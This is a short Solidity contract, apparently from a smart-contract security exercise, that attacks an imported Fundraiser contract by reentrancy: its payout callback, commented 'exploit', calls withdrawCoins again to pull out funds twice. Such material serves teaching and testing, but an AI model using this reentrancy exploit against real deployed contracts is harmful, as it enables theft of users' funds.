// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "./Fundraiser.sol";

contract Wallet {
    Fundraiser public fundraiser;
    uint256 recursion = 2;

    constructor(address fundraiserAddress) payable {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint256 amount) public payable {
        fundraiser.contribute{value: amount}();
    }

    function withdraw() public {
        fundraiser.withdrawCoins();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function payout() public payable {
        // exploit
        if (recursion > 0) {
            recursion--;
            fundraiser.withdrawCoins();
        }
    }
}
